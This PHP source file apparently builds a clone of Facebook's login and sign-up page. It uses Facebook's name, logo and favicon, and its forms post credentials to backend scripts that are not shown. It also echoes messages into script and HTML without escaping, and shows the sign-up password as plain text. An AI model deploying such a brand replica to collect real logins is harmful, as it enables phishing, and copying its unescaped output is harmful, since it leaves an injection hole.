<?php
  include_once 'php/login.php';
  include_once 'php/register.php';
?>

<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <link rel="icon" href="https://static.xx.fbcdn.net/rsrc.php/yb/r/hLRJ1GG_y0J.ico">
    <link
      href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css"
      rel="stylesheet"
      integrity="sha384-T3c6CoIi6uLrA9TneNEoa7RxnatzjcDSCmG1MXxSR1GAsXEV/Dwwykc2MPK8M2HN"
      crossorigin="anonymous"
    />

    <?php require 'php/link.php' ?>
    <script
      src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"
      integrity="sha384-C6RzsynM9kWDrMNeT87bh95OGNyZPhcTNXj1NW7RuBCsyN/o0jlpcV8Qyq46cDfL"
      crossorigin="anonymous"
    ></script>

    <link rel="stylesheet" href="css/login.css" />
    <title>Facebook - log in or sign up</title>
  </head>
  <body>
    <!-- Display the alert message if it's not empty -->
    <?php if (!empty($alertMessage)) : ?>
      <script>
        alert("<?php echo $alertMessage; ?>");
        window.location.href = "index.php"; // Redirect to the index page
      </script>
    <?php endif; ?>

    <section class="container" id="container">
      <div class="container-left text-center">
        <div class="d-flex align-items-center justify-content-center">
          <img
            class=""
            style="width: 350px"
            src="https://static.xx.fbcdn.net/rsrc.php/yI/r/4aAhOWlwaXf.svg"
            alt="Facebook"
          />
        </div>
        <p class="text-gray-500 fs-2">
          Facebook helps you connect and share with the people in your life.
        </p>
      </div>

      <div class="container-right">
        <form class="px-4 py-4" method="POST">
          <!-- Error message -->
          <?php if (!empty($error)): ?>
            <div class="alert alert-danger"><?php echo $error; ?></div>
          <?php endif; ?>
          
          <!-- email -->
          <div class="mb-4">
            <input
              type="email"
              name="emailOrPhone"
              class="form-control"
              style="padding: 15px"
              id="exampleInputEmail1"
              aria-describedby="emailHelp"
              placeholder="Email address or Phone number"
            />
          </div>

          <!-- password -->
          <div class="mb-3">
            <input
              type="password"
              name="password"
              class="form-control"
              style="padding: 15px"
              id="exampleInputPassword1"
              placeholder="Password"
            />
          </div>

          <!-- login btn -->
          <button
            type="submit"
            name="login"
            class="btn btn-primary col-12 mx-auto fw-bold"
            style="font-size: 18px; padding: 10px 20px 10px 20px"
          >
            Log in
          </button>

          <!-- forgot password -->
          <div class="text-center pt-3 Forgotten">
            <a href="./html/fogotpassword/fogotpassword.php" class="text-center mt-3">Forgotten password?</a>
          </div>
          <hr />

          <!-- create new account -->
          <div class="text-center">
            <button
              type="button"
              class="btn btn-success fw-bold"
              style="padding: 10px 20px 10px 20px; font-size: 18px"
              data-bs-toggle="modal"
              data-bs-target="#signup"
              data-bs-whatever="@mdo"
            >
              Create new account
            </button>
          </div>
        </form>

        <!-- create page -->
        <div class="text-center mt-3">
          <p>
            <a href="" style="text-decoration: none" class="fw-bold text-dark"
              >Create a Page</a
            >
            for a celebrity, brand or business.
          </p>
        </div>
      </div>
    </section>

    <!-- sign up -->
    <div
      class="modal fade"
      id="signup"
      tabindex="-1"
      aria-labelledby="exampleModalLabel"
      aria-hidden="true"
    >
      <div class="modal-dialog modal-dialog-centered">
        <div class="modal-content">
          <div class="modal-header">
            <h1 class="modal-title fs-5" id="exampleModalLabel">
              Sign Up<br /><span
                style="font-size: medium"
                class="text-secondary fw-normal"
                >It's quick and easy.</span
              >
            </h1>
            <button
              type="button"
              class="btn-close"
              data-bs-dismiss="modal"
              aria-label="Close"
            ></button>
          </div>

          <!-- form sign up -->
          <div class="modal-body">
            <form method="POST">
              <div class="d-flex col-12 mb-2">

                <!-- firs name -->
                <div class="pe-1 col-6">
                  <input
                    type="text"
                    class="form-control"
                    id="first_name"
                    name="first_name"
                    placeholder="First name"
                  />
                </div>

                <!-- surname -->
                <div class="ps-1 col-6">
                  <input
                    type="text"
                    class="form-control"
                    id="surname"
                    name="surname"
                    placeholder="Surname"
                  />
                </div>
              </div>

              <!-- email -->
              <div class="mb-2">
                <input
                  type="text"
                  class="form-control"
                  id="mobileOrEmail"
                  name="mobileOrEmail"
                  placeholder="Mobile number or email address"
                />
              </div>

              <!-- password -->
              <div class="mb-2">
                <input
                  type="text"
                  class="form-control"
                  id="password"
                  name="password"
                  placeholder="New password"
                />
              </div>

              <!-- date of birth -->
              <div class="mb-2">
                <div class="d-flex align-items-center gap-1">
                    <label for="">Date of birth </label>
                    <svg xmlns="http://www.w3.org/2000/svg" height="0.8em" viewBox="0 0 320 512"><!--! Font Awesome Free 6.4.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license (Commercial License) Copyright 2023 Fonticons, Inc. --><path d="M80 160c0-35.3 28.7-64 64-64h32c35.3 0 64 28.7 64 64v3.6c0 21.8-11.1 42.1-29.4 53.8l-42.2 27.1c-25.2 16.2-40.4 44.1-40.4 74V320c0 17.7 14.3 32 32 32s32-14.3 32-32v-1.4c0-8.2 4.2-15.8 11-20.2l42.2-27.1c36.6-23.6 58.8-64.1 58.8-107.7V160c0-70.7-57.3-128-128-128H144C73.3 32 16 89.3 16 160c0 17.7 14.3 32 32 32s32-14.3 32-32zm80 320a40 40 0 1 0 0-80 40 40 0 1 0 0 80z"/></svg>
                </div>
                <div class="d-flex gap-2 mt-1">
                    <!-- Day -->
                    <select
                        aria-label="Day"
                        name="birthday_day"
                        id="day"
                        title="Day"
                        class="form-select"
                      >
                        <option value="1">1</option>
                        <option value="2">2</option>
                        <option value="3">3</option>
                        <option value="4">4</option>
                        <option value="5">5</option>
                        <option value="6">6</option>
                        <option value="7">7</option>
                        <option value="8">8</option>
                        <option value="9">9</option>
                        <option value="10">10</option>
                        <option value="11">11</option>
                        <option value="12">12</option>
                        <option value="13">13</option>
                        <option value="14">14</option>
                        <option value="15">15</option>
                        <option value="16">16</option>
                        <option value="17">17</option>
                        <option value="18">18</option>
                        <option value="19">19</option>
                        <option value="20">20</option>
                        <option value="21">21</option>
                        <option value="22">22</option>
                        <option value="23">23</option>
                        <option value="24">24</option>
                        <option value="25" selected="1">25</option>
                        <option value="26">26</option>
                        <option value="27">27</option>
                        <option value="28">28</option>
                        <option value="29">29</option>
                        <option value="30">30</option>
                        <option value="31">31</option>
                    </select>

                    <!-- month -->
                    <select
                        aria-label="Month"
                        name="birthday_month"
                        id="month"
                        title="Month"
                        class="form-select"
                      >
                        <option value="1">Jan</option>
                        <option value="2">Feb</option>
                        <option value="3">Mar</option>
                        <option value="4">Apr</option>
                        <option value="5">May</option>
                        <option value="6">Jun</option>
                        <option value="7">Jul</option>
                        <option value="8">Aug</option>
                        <option value="9">Sep</option>
                        <option value="10">Oct</option>
                        <option value="11">Nov</option>
                        <option value="12">Dec</option>
                    </select>

                    <!-- year -->
                    <select
                        aria-label="Year"
                        name="birthday_year"
                        class="form-select"
                        id="year"
                        title="Year"
                    >
                        <option value="2023" selected="1">2023</option>
                        <option value="2022">2022</option>
                        <option value="2021">2021</option>
                        <option value="2020">2020</option>
                        <option value="2019">2019</option>
                        <option value="2018">2018</option>
                        <option value="2017">2017</option>
                        <option value="2016">2016</option>
                        <option value="2015">2015</option>
                        <option value="2014">2014</option>
                        <option value="2013">2013</option>
                        <option value="2012">2012</option>
                        <option value="2011">2011</option>
                        <option value="2010">2010</option>
                        <option value="2009">2009</option>
                        <option value="2008">2008</option>
                        <option value="2007">2007</option>
                        <option value="2006">2006</option>
                        <option value="2005">2005</option>
                        <option value="2004">2004</option>
                        <option value="2003">2003</option>
                        <option value="2002">2002</option>
                        <option value="2001">2001</option>
                        <option value="2000">2000</option>
                        <option value="1999">1999</option>
                        <option value="1998">1998</option>
                        <option value="1997">1997</option>
                        <option value="1996">1996</option>
                        <option value="1995">1995</option>
                        <option value="1994">1994</option>
                        <option value="1993">1993</option>
                        <option value="1992">1992</option>
                        <option value="1991">1991</option>
                        <option value="1990">1990</option>
                        <option value="1989">1989</option>
                        <option value="1988">1988</option>
                        <option value="1987">1987</option>
                        <option value="1986">1986</option>
                        <option value="1985">1985</option>
                        <option value="1984">1984</option>
                        <option value="1983">1983</option>
                        <option value="1982">1982</option>
                        <option value="1981">1981</option>
                        <option value="1980">1980</option>
                        <option value="1979">1979</option>
                        <option value="1978">1978</option>
                        <option value="1977">1977</option>
                        <option value="1976">1976</option>
                        <option value="1975">1975</option>
                        <option value="1974">1974</option>
                        <option value="1973">1973</option>
                        <option value="1972">1972</option>
                        <option value="1971">1971</option>
                        <option value="1970">1970</option>
                        <option value="1969">1969</option>
                        <option value="1968">1968</option>
                        <option value="1967">1967</option>
                        <option value="1966">1966</option>
                        <option value="1965">1965</option>
                        <option value="1964">1964</option>
                        <option value="1963">1963</option>
                        <option value="1962">1962</option>
                        <option value="1961">1961</option>
                        <option value="1960">1960</option>
                        <option value="1959">1959</option>
                        <option value="1958">1958</option>
                        <option value="1957">1957</option>
                        <option value="1956">1956</option>
                        <option value="1955">1955</option>
                        <option value="1954">1954</option>
                        <option value="1953">1953</option>
                        <option value="1952">1952</option>
                        <option value="1951">1951</option>
                        <option value="1950">1950</option>
                        <option value="1949">1949</option>
                        <option value="1948">1948</option>
                        <option value="1947">1947</option>
                        <option value="1946">1946</option>
                        <option value="1945">1945</option>
                        <option value="1944">1944</option>
                        <option value="1943">1943</option>
                        <option value="1942">1942</option>
                        <option value="1941">1941</option>
                        <option value="1940">1940</option>
                        <option value="1939">1939</option>
                        <option value="1938">1938</option>
                        <option value="1937">1937</option>
                        <option value="1936">1936</option>
                        <option value="1935">1935</option>
                        <option value="1934">1934</option>
                        <option value="1933">1933</option>
                        <option value="1932">1932</option>
                        <option value="1931">1931</option>
                        <option value="1930">1930</option>
                        <option value="1929">1929</option>
                        <option value="1928">1928</option>
                        <option value="1927">1927</option>
                        <option value="1926">1926</option>
                        <option value="1925">1925</option>
                        <option value="1924">1924</option>
                        <option value="1923">1923</option>
                        <option value="1922">1922</option>
                        <option value="1921">1921</option>
                        <option value="1920">1920</option>
                        <option value="1919">1919</option>
                        <option value="1918">1918</option>
                        <option value="1917">1917</option>
                        <option value="1916">1916</option>
                        <option value="1915">1915</option>
                        <option value="1914">1914</option>
                        <option value="1913">1913</option>
                        <option value="1912">1912</option>
                        <option value="1911">1911</option>
                        <option value="1910">1910</option>
                        <option value="1909">1909</option>
                        <option value="1908">1908</option>
                        <option value="1907">1907</option>
                        <option value="1906">1906</option>
                        <option value="1905">1905</option>
                    </select>
                </div>
              </div>

              <!-- gender -->
              <div class="">
                <label for="">Gender </label>
                <div class="d-flex gap-2 mt-1">
                    <div class="form-check form-control" >
                        <div class="" style="display: flex;justify-content: space-between;">
                            <div class="">
                                <label class="form-check-label" for="female">Female</label>
                            </div>
                            <div class="">
                                <input
                                type="radio"
                                class="form-check-input"
                                name="gender"
                                value="1"
                                id="female" />
                            </div>
                        </div>
                    </div>
                    <div class="form-check form-control">
                        <div class="" style="display: flex;justify-content: space-between;">
                            <div class="">
                                <label class="form-check-label" for="male">Male</label>
                            </div>
                            <div class="">
                                <input
                                type="radio"
                                class="form-check-input "
                                name="gender"
                                value="2"
                                id="male" />
                            </div>

                        </div>

                    </div>
                </div>
              </div>
              <div class="mt-2 text-secondary" style="font-size: 13px;">
                <p >People who use our service may have uploaded your contact information to Facebook. Learn more.</p>
              </div>
              <div class="text-secondary" style="font-size: 13px;">
                <p>By clicking Sign Up, you agree to our Terms, Privacy Policy and Cookies Policy. You may receive SMS notifications from us and can opt out at any time.</p>
              </div>

              <!-- submit button -->
              <div class="text-center mb-3">
                <button type="submit" name="sing_up" class="btn btn-success fw-bold" style="padding: 7px 30px 7px 30px;">Sign up</button>
              </div>

            </form>

          </div>
        </div>
      </div>
    </div>
  </body>
</html>
